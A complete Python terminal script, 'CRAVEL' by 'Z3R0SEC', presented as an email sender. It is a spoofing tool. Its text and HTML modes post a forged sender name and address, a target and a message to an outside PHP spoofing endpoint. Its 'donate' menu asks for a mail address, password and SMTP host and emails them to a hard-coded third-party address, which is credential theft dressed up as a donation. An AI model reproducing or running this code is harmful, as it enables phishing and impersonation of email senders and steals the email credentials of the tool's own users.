import os
import signal
import time
import sys
from os import system as sy
from time import sleep as sl
from random import randint as ch
from requests import post as ps
from datetime import datetime

today = datetime.today()
compare = datetime(2024, 3, 26)

dire = "/sdcard/index.html"
if os.path.exists(dire):
   pass
else:
   sy("echo 'Default HTML Page!.\n Whatsapp : +27847611848' > /sdcard/index.html")


ago = (today - compare).days

h = "\033[1;41m"
u = "\033[1;42m"
r = "\033[1;0m"
o = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
n = "\033[38;5;208m"

line = f"{g}═" * (os.get_terminal_size().columns)
l = f"{n}═" * (os.get_terminal_size().columns - 8)


def ctrl(signal, frame):
    print("\n [ CTRL ] User Enterupt\n")
    exit()

signal.signal(signal.SIGINT, ctrl)

def logo():
   sy("clear")
   logo = f"""
{y}  ███████████████████████████████████
{o} █─▄▄▄─█▄─▄▄▀██▀▄─██▄─█─▄█▄─▄▄─█▄─▄███
{y} █─███▀██─▄─▄██─▀─███▄▀▄███─▄█▀██─██▀█
{o} ▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▀▀▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀
{g}{line}
           {r}[:: {h}V2.01{u}BETA{r} ::]
{g}{line}"""
   print(logo)


def home():
   print(line)
   print(f" {r}[{g}0{r}] {y}MAIN MENU")
   print(f" {r}[{g}E{r}] {y}EXIT TOOL")
   print(line)
   opt = input(f" {y}[{r}•{y}] {o}OPTION >{n} ")
   if opt.lower() in ["0","00","o","menu","main"]:
      options()
   elif opt.lower() in ["e","exit","quit","leave"]:
        sy("clear")
        print("\n THANK YOU FOR USING OUR TOOL")
        print()
        print()
        exit()
   else:
        print("\n [×] Invalid Option \n")
        print("\n [?] TAKING YOU HOME!")
        sl(3)
        options()


def options():
   logo()
   print(f" {o}[{b}1{o}] {g}SEND TEXT EMAIL {r}({y}Plain{r})")
   print(f" {o}[{b}2{o}] {g}SEND HTML EMAIL {r}({y}File{r})")
   print(f" {o}[{b}3{o}] {g}DONATE WEB MAIL")
   print(f" {o}[{b}4{o}] {g}ABOUT TOOL")
   print(line)
   opt = input(f" {o}[ {r}Z3R0SEC {o}] {n}${b} ")
   sl(1)
   if opt in ["1","01"]:
      text()
   elif opt in ["2","02"]:
        file()
   elif opt in ["3","03"]:
        donate()
   elif opt in ["4","04"]:
        about()

def text():
   logo()
   print(f"    {o}====={y}( {g}{h}TEXT EMAIL SENDER{r} {y}){o}=====")
   print(line)
   name = input(f" {b}[{g}+{b}] {o}Send As Name >{n} ")
   mail = input(f" {b}[{g}+{b}] {o}Send As Mail >{n} ")
   user = input(f" {b}[{g}+{b}] {o}Target Email >{n} ")
   usr1 = input(f" {b}[{g}+{b}] {o}Mail Subject >{n} ")
   print(line)
   mesg = input(f" {b}[{g}+{b}] {o}MESSAGE >{n} ")
   print(line)
   print(f" CONTACTING : {user}")
   server = "https://dang3r.000webhostapp.com/spoof/index.php"
   files = {
       'name': (None, name),
       'subject': (None, usr1),
       'to': (None, user),
       'email': (None, mail),
       'message': (None, mesg),
       'send': (None, "send"),
   }
   try:
      resp = ps(server, files=files)
      data = resp.text
      status = data.lower()
      print(line)
      if "email sent !" in status:
         print(f" STATUS : Sent")
         print(f" TARGET : {user}")
         print(f" SENTAS : {name}")
         print(line)
         home()
      else:
         print(f" STATUS : Not Sent")
         print(f" TARGET : {user}")
         print(f" REASON : TARGET MAIL OR SERVER ERROR!")
         print(line)
         home()
   except Exception as e:
         print(f" [ ERR ] ERROR SENDING AN EMAIL")
         exit()

def file():
   logo()
   print(f"    {o}====={y}( {g}{h}HTML EMAIL SENDER{r} {y}){o}=====")
   print(line)
   name = input(f" {b}[{g}+{b}] {n}Send As Name >{o} ")
   mail = input(f" {b}[{g}+{b}] {n}Send As Mail >{o} ")
   user = input(f" {b}[{g}+{b}] {n}Target Email >{o} ")
   usr1 = input(f" {b}[{g}+{b}] {n}Mail Subject >{o} ")
   print(line)
   path = input(f" {o}[{y}+{o}] {n}HTML Path >{o} ")
   print(line)
   if os.path.exists(path):
      with open(path,"r") as file:
          mesg = file.read()
   else:
      path = ""
      print(line)
      print(f" {o}[×] Example path : /sdcard/mail.html")
      while path == "":
          print(line)
          path = input(" [+] HTML Path > ")
          with open(path,"r") as file:
               mesg = file.read()
   print(f" CONTACTING : {user}")
   server = "https://dang3r.000webhostapp.com/spoof/index.php"
   files = {
       'name': (None, name),
       'subject': (None, usr1),
       'to': (None, user),
       'email': (None, mail),
       'message': (None, mesg),
       'send': (None, "send"),
   }
   resp = ps(server, files=files)
   data = resp.text
   status = data.lower()
   print(line)
   if "email sent !" in status:
      print(f" STATUS : Sent")
      print(f" TARGET : {user}")
      print(f" SENTAS : {name}")
      print(line)
      home()
   else:
      print(f" STATUS : Not Sent")
      print(f" TARGET : {user}")
      print(f" REASON : SEVER OR MAIL ERROR")
      print(line)
      home()



sy("tput civis")
def loading():
    logo()
    data = f"{ch(40,55)}"
    duration = int(data)
    chars = "/-\\|"
    print("\n\n\n")
    message = " [•] Z3R0SEC TOOLS LOADING"
    for i in range(duration):
        sys.stdout.write('\r')
        sys.stdout.write(message[:i % len(message)] + message[i % len(message)].swapcase() + message[i % len(message) + 1:])
        sys.stdout.write(" " + chars[i % len(chars)])
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\r')
    sys.stdout.write(" " * (len(message) + 2))
    sys.stdout.flush()
    sy("tput cnorm")
    options()


def donate():
   message = "Thank You For Willing to Help!\nWe Are Using GMAIL as Host This Means\nThat SendAs() Function Doesnt Work. So\nDonating a WebMail indeed Will Help!"
   logo()
   print(message)
   print(line)
   print()
   print(f"{h} ABOUT YOU: {r}")
   print(l)
   name = input(f" {b}[{r}♡{b}] {g}Ya Name >{n} ")
   mail = input(f" {b}[{r}♡{b}] {g}Ya Mail >{n} ")
   print()
   print(f"{h} DONATION INFO: {r}")
   print(l)
   dmail = input(f" {b}[{o}✉{b}] {g}Email >{n} ")
   if dmail == "":
      dmail = "NoData!"
   dpass = input(f" {b}[{o}⚷{b}] {g}Mail Password >{n} ")
   if dpass == "":
      dpass = "NoData"
   dhost = input(f" {o}[{y}${o}] {g}SMTP HOST >{o} ")
   print()
   mesg = f"DONATED DATA ARE AS FOLLOW\n\n<b>USER :</b> {dmail}\n<b>SEC :</b> {dpass}\n<b>HOST :</b> {dhost}\n\nThis Has Been Sent By {name}\nReply To <b>{mail}</b>."
   server = "https://dang3r.000webhostapp.com/spoof/index.php"
   files = {
       'name': (None, "Cp@breazy"),
       'subject': (None, f"Donation From {name}"),
       'to': (None, "coldbreazy@yahoo.com"),
       'email': (None, "Worldmailspha@gmail.com"),
       'message': (None, mesg),
       'send': (None, "send"),
   }
   try:
      resp = ps(server, files=files)
      data = resp.text
      status = data.lower()
      print(line)
   except requests.exceptions.ReadTimeout:
         print(" [ INTERNET CONNECTION ERROR!")
         exit("\n")
   except Exception as e:
         print(" [ INTERNET CONNECTION ERROR")

   if "email sent !" in status:
      message = "Received"
      reason = "Posted into The DataBase"
   else:
      message = "Not Received"
      reason = "Server Error! Failed to connect!"

   print(f"{r}{h} DELIVERY REPORT : {r}")
   print(l)
   print(f" WE HAVE {message} Your Donation!")
   print(f" STATUS : {reason}")
   print(line)
   sl(2)
   home()

def about():
   logo()
   print()
   print(f"{h} ABOUT ME! {r}")
   print(l)
   print(" [•] AGE : 16YRS")
   print(" [•] SEX : MALE")
   print(" [•] FCB : Z3R0SEC")
   print(" [•] LAN : PYTHON, JAVA")
   print(" [•] GIT : Z3R0SEC")
   print()
   sl(2)
   print(f"{h} ABOUT TOOL! {r}")
   print(l)
   print(f" {o}[{y}-{o}] {g}TOOL NAME : {o}CRAVEL")
   print(f" {o}[{y}-{o}] {g}TOOL LANG : {o}PYTHON")
   print(f" {o}[{y}-{o}] {g}TOOL DEVE : {o}Z3R0{g}SEC")
   print(f" {o}[{y}-{o}] {g}TOOL UPDT : {o}{ago} DAYS AGO")
   print(f" {o}[{y}-{o}] {g}TOOL SERV : {o}EMAIL SENDER{r}")
   print()
   sl(2)
   print(f"{h} OUR SLANG! {r}")
   print(l)
   print(" [+] CYBER PALADINS")
   print(" [^] HACKING IS NOT A CRIME")
   print(" [^] BUT A GAME AGAINST THE SYSTEM")
   print()
   home()

loading()
